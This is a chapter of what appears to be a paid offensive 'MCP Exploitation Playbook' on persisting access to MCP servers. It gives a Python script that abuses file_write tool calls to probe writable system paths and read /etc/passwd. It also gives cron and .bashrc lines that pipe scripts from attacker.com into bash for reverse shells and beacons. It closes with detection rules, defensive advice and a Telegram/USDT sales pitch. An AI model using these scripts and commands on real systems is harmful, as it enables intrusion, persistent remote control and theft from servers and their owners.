# Chapter 07 — Server Injection
## The 9099 Files — MCP Exploitation Playbook

---

## What It Is

Server injection means modifying the MCP server configuration or deployment files to insert persistent access mechanisms. Unlike prompt injection (which targets the model), server injection targets the infrastructure. The attacker modifies server configs, startup scripts, or environment files to maintain access even if the initial exploitation vector is closed.

This is the difference between popping a shell and keeping a shell. The initial access might be closed. The injection persists.

---

## Why This Works

MCP servers are often deployed with configuration files, environment variables, startup scripts, or Docker volumes. If an attacker can write to any of those locations, they can insert code that executes on server restart, under the service account's privileges.

Common writable locations:
- Environment files (`.env`)
- Startup scripts (`/etc/init.d/`, `systemd units`)
- Dockerfiles or docker-compose files
- Kubernetes configs or secrets
- Cron jobs
- `.bashrc` or `.profile` for the service account

---

## The Attack

### Step 1 — Identify Writable Configuration Files

```python
#!/usr/bin/env python3
"""
MCP Server Injection — Config File Modifier
Test which config locations are writable and can persist code execution
"""
import requests
import json
import sys
import os
import hashlib

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

INJECTION_POINTS = [
    ("environment", ".env", "API_KEY=injected"),
    ("init_script", "/etc/init.d/mcp-server", None),
    ("dockerfile", "./Dockerfile", None),
    ("docker_compose", "./docker-compose.yml", None),
    ("cron", "/etc/cron.d/mcp-backdoor", "*/5 * * * * root curl http://attacker.com/beacon.sh | bash"),
    ("bashrc", "/home/mcp/.bashrc", "curl -s http://attacker.com/shell.sh | bash"),
    ("service", "/etc/systemd/system/mcp.service", None),
]

def test_write_via_mcp(target, path, content=None):
    """Try to write to a config location using MCP tools"""
    payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "file_write",
            "arguments": {"path": path, "content": content or "INJECTED"}
        }
    }
    try:
        r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
        return "error" not in r.json()
    except:
        return False

def detect_writable_configs(target):
    print(f"[*] MCP Server Injection Tester")
    print(f"[*] Target: {TARGET}\n")
    
    # Use MCP tool to check file existence and permissions
    check_payload = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "file_read",
            "arguments": {"path": "/etc/passwd"}
        }
    }
    try:
        r = requests.post(f"{target}/mcp/call", json=check_payload, timeout=10)
        can_read_etc = "error" not in r.json()
    except:
        can_read_etc = False
    
    print(f"[*] Can read /etc/passwd: {can_read_etc}")
    
    # High-value paths to check
    paths_to_check = [
        "/etc/cron.d/",
        "/etc/init.d/",
        "/home/mcp/.bashrc",
        "/home/mcp/.profile",
        ".env",
        "./Dockerfile",
        "./docker-compose.yml",
        "/app/.env",
        "/app/config/",
    ]
    
    print(f"[*] Checking high-value injection paths...\n")
    
    writable = []
    for path in paths_to_check:
        test_payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "file_write",
                "arguments": {"path": path, "content": "INJECTION_TEST"}
            }
        }
        try:
            r = requests.post(f"{target}/mcp/call", json=test_payload, timeout=10)
            if "error" not in r.json() and r.json().get("result") != "error":
                print(f"    [!] WRITABLE: {path}")
                writable.append(path)
        except:
            pass
    
    return writable

if __name__ == "__main__":
    writable = detect_writable_configs(TARGET)
    if writable:
        print(f"\n[!] {len(writable)} high-value paths writable")
        print("[!] These can be used for persistent access via server restart")
        print("[!] Inject into startup scripts or cron for persistence")
```

### Step 2 — Persistence via Cron

If `/etc/cron.d/` is writable:

```bash
# Write a cron job that pulls a reverse shell every 5 minutes
*/5 * * * * mcp-user curl -s http://attacker.com/shell.sh | bash

# Or a simpler beacon
*/5 * * * * mcp-user wget -qO- http://attacker.com/beacon.sh | bash
```

### Step 3 — Persistence via .bashrc

If the MCP server runs as a specific user:

```bash
# Append to the user's bashrc
echo "curl -s http://attacker.com/persist.sh | bash" >> /home/mcp-user/.bashrc
```

Every new shell session or SSH connection triggers the beacon.

---

## Real Case

**Jenkins CI/CD server injection**

Jenkins servers with execute permissions often get a variant of this attack. An attacker who can write files writes a malicious script to `/etc/cron.d/` or modifies the Jenkins startup script. When Jenkins restarts (for normal maintenance), the malicious code executes. The attacker doesn't need to keep an active connection. The persistence is built into the infrastructure.

---

## Detection Rules

### KQL

```kql
MCP_ToolInputs
| where ToolName == "file_write"
    and (FilePath contains "/etc/" 
         or FilePath contains "/home/"
         or FilePath contains ".bashrc"
         or FilePath contains ".profile"
         or FilePath contains "cron"
         or FilePath contains ".env")
| project TimeGenerated, ToolName, FilePath, Arguments
```

### Sigma

```yaml
title: MCP Server Config Write
log_source: mcp_server
detection:
  selection:
    event.type: tool_call
    tool.name: file_write
    file.path|contains:
      - /etc/cron
      - /etc/init.d
      - /home/
      - .bashrc
      - .profile
      - .env
  condition: selection
level: critical
```

---

## Defenses

1. **MCP service account should not be root** — Run the MCP server as a dedicated service account with no write access to system directories. Cron, init.d, and systemd directories should be writable only by root.

2. **Read-only filesystem where possible** — Use read-only containers and filesystems. If the application directory is read-only, file_write tools can't modify configs.

3. **Immutable infrastructure** — MCP servers should be deployed via immutable images (Docker, cloud images). Configuration changes should require rebuilding the image, not writing to the running container.

4. **Monitor /etc and config directory writes** — File integrity monitoring (AIDE, Tripwire, or Falco) should alert on any writes to `/etc/`, `/var/spool/cron/`, or service user home directories.

5. **Regular restart doesn't auto-execute** — Design the server so that restarts don't execute arbitrary code from writable locations. Store configs in protected locations, not in user-writable directories.

---

**$29 USDT — Full Playbook with 10 Chapters**

TX hash to `@hunnidinnit` on Telegram.